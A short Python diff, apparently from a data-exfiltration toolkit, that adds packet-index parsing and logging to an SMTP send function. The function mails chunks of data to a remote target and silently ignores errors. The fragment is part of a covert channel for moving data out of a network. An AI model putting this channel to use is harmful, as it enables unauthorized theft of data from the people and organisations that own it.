@@ -38,7 +38,10 @@ def send(data):
     msg['From'] = email.utils.formataddr(('Author', author))
     msg['Subject'] = subject
     server = smtplib.SMTP(target, port)
+    packet_index = data.split('|!|')[1]
     try:
+        app_exfiltrate.log_message(
+            'info', "[smtp] Sending {0} bytes with SMTP packet to {1}. PacketIndex = {2}".format(len(data), target, packet_index))
         server.sendmail(author, [recipient], msg.as_string())
     except:
         pass
